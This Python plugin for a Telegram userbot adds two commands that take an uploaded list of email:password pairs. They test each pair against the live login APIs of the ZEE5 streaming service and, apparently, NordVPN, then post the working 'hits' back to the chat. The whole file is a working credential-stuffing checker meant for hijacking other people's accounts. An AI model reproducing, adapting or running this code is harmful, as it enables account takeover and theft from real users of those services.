import json
import os
import requests

from fridaybot.utils import friday_on_cmd
data = {
   "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
   "Content-Length": "55",
   "Accept-Encoding":"gzip"
}

@friday.on(friday_on_cmd(pattern="cz5$"))
async def hotstar(event):
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    file = open(starky, "r")
    lines = file.readlines()
    for line in lines:
        stark_dict.append(line)
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        try:
            meke = requests.get(f'https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}').json()
        except Exception as s:
            await event.edit("**Errors : **" + str(s))
            return
        if meke.get("token"):
            hits += 1
            hits_dict.append(f"{email}:{password}")
        else:
            bads += 1
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s)
    await borg.send_file(
        event.chat_id, "hits.txt", caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
    )
    os.remove(starky)
    os.remove("hits.txt")

@friday.on(friday_on_cmd(pattern="cnd"))
async def vypr(event):
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    file = open(starky, "r")
    lines = file.readlines()
    for line in lines:
        stark_dict.append(line)
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        sedlyf = {
        "username" : email,
        "password" : password
        }
        try:
            meke = requests.post(url='https://zwyr157wwiu6eior.com/v1/users/tokens', headers=data, json=sedlyf).json()
        except Exception as s:
            await event.edit("**Errors : **" + str(s))
            return
        if meke.get("token"):
            hits += 1
            hits_dict.append(f"{email}:{password}")
        else:
            bads += 1
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s)
    await borg.send_file(
        event.chat_id, "hits.txt", caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
    )
    os.remove(starky)
    os.remove("hits.txt")
